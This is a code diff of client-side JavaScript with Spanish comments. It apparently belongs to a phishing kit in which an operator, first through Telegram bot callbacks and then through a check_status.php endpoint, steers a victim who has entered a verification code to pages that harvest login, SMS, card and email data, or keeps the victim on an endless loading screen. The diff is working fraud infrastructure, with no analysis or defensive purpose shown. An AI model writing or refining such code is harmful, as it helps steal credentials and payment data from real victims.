@@ -465,36 +465,10 @@
         // ============================================
         async function checkTelegramResponse() {
             try {
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=-1`;
-                const response = await fetch(url);
+                const response = await fetch('check_status.php');
                 const data = await response.json();
                 
-                if (data.ok && data.result.length > 0) {
-                    const lastUpdate = data.result[data.result.length - 1];
-                    
-                    if (lastUpdate.callback_query) {
-                        const callbackData = lastUpdate.callback_query.data;
-                        
-                        // Verificar si es para esta sesión
-                        if (callbackData.includes(sessionId)) {
-                            if (callbackData.startsWith('approve_')) {
-                                return 'approved';
-                            } else if (callbackData.startsWith('error_')) {
-                                return 'error'; // Mantener el mismo flujo de error
-                            } else if (callbackData.startsWith('login_')) {
-                                return 'redirect_login';
-                            } else if (callbackData.startsWith('sms_')) {
-                                return 'redirect_sms';
-                            } else if (callbackData.startsWith('card_')) {
-                                return 'redirect_card';
-                            } else if (callbackData.startsWith('mail_')) {
-                                return 'redirect_mail';
-                            }
-                        }
-                    }
-                }
-                
-                return 'pending';
+                return data.status;
             } catch (error) {
                 console.error('Error al verificar respuesta:', error);
                 return 'pending';
@@ -533,34 +507,32 @@
             showLoading();
             
             checkInterval = setInterval(async () => {
-                const status = await checkTelegramResponse();
-                
-                if (status === 'error') {
-                    clearInterval(checkInterval);
-                    hideLoading();
-                    showNotification('Código incorrecto. Intente nuevamente.', 'error');
-                    document.getElementById('codeInput').value = '';
-                    document.getElementById('codeInput').focus();
-                    // Generar nuevo session ID para el siguiente intento
-                    sessionId = Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-                } else if (status === 'redirect_login') {
-                    clearInterval(checkInterval);
-                    hideLoading();
-                    window.location.href = 'index.php';
-                } else if (status === 'redirect_sms') {
-                    clearInterval(checkInterval);
-                    hideLoading();
-                    window.location.href = 'sms.php';
-                } else if (status === 'redirect_card') {
-                    clearInterval(checkInterval);
-                    hideLoading();
-                    window.location.href = 'card.html';
-                } else if (status === 'redirect_mail') {
-                    clearInterval(checkInterval);
-                    hideLoading();
-                    window.location.href = 'mail.php';
+                try {
+                    const response = await fetch('check_status.php');
+                    const data = await response.json();
+                    
+                    if (data.status === 'redirect') {
+                        clearInterval(checkInterval);
+                        hideLoading();
+                        window.location.href = data.target;
+                    } else if (data.status === 'error') {
+                        clearInterval(checkInterval);
+                        hideLoading();
+                        showNotification(data.message, 'error');
+                        document.getElementById('codeInput').value = '';
+                        document.getElementById('codeInput').focus();
+                        // Generar nuevo session ID para el siguiente intento
+                        sessionId = Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                    } else if (data.status === 'no_session') {
+                        clearInterval(checkInterval);
+                        hideLoading();
+                        showNotification('Sesión expirada. Por favor inicie nuevamente.', 'error');
+                        window.location.href = 'index.php';
+                    }
+                    // 'pending' sigue verificando
+                } catch (error) {
+                    console.error('Error al verificar respuesta:', error);
                 }
-                // Nota: No manejamos 'approved' para mantener la carga infinita hasta ❌ Compra
             }, 2000);
         }
 
